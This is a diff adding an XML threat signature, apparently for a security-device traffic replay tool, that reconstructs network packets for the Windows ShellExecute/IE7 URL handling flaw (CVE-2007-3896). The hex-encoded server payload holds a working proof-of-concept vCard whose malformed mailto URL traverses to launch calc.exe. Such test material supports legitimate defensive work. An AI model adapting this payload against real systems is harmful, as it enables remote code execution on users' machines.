@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Windows ShellExecute and IE7 URL Handling Code Execution"/>
+    <EngDesc display="true" value="A vulnerability has been reported in Microsoft Windows that could be exploited by remote attackers to compromise a vulnerable system. The issue exists in the interaction between ShellExecute and IE7 URLMon component when handling malformed URLs. Successful exploitation would allow the attacker to execute arbitrary command on the vulnerable client system within the context of the logged in user."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Windows"/>
+      <item value="Microsoft_Microsoft_Windows_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_XP"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20070726-10"/>
+    <CVEID display="true" value="CVE-2007-3896"/>
+    <bugtraqID display="true" value="25945"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="8117a6be9da24bb56d0e242bd5547a41"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633612465575781250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1216321138" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01A4" Identification="0568" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="91EF" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="B1F41F41" AckNumber="009A7736" HeaderLength="05" WindowSize="FAF0" Checksum="F0E7" UrgentPointer="0000" Options="" Payload="474554202F7E626C696E2F706F632E76636620485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A55412D4350553A207838360D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520372E303B2057696E646F7773204E5420352E31290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0234" Identification="B18F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="2538" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="009A7736" AckNumber="B1F420BD" HeaderLength="05" WindowSize="1920" Checksum="BE15" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203136204F637420323030372030303A34393A323320474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E39206D6F645F707974686F6E2F332E312E3320507974686F6E2F322E332E34206D6F645F7065726C2F322E302E31205065726C2F76352E382E350D0A4C6173742D4D6F6469666965643A205475652C203136204F637420323030372030303A34383A333220474D540D0A455461673A20226462306137352D39352D3862346635383030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203134390D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F706C61696E3B20636861727365743D49534F2D383835392D310D0A0D0A424547494E3A56434152440D0A56455253494F4E3A322E310D0A4E3A3B706F630D0A464E3A706F630D0A55524C3B484F4D453A6D61696C746F3A706F6340746573742E636F6D666F6F252E2E2F2E2E2F2E2E2F2E2E2F77696E646F77732F73797374656D33322F63616C632E657865222E636D640D0A5245563A3230303731303135543035323135355A0D0A454E443A5643415244" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
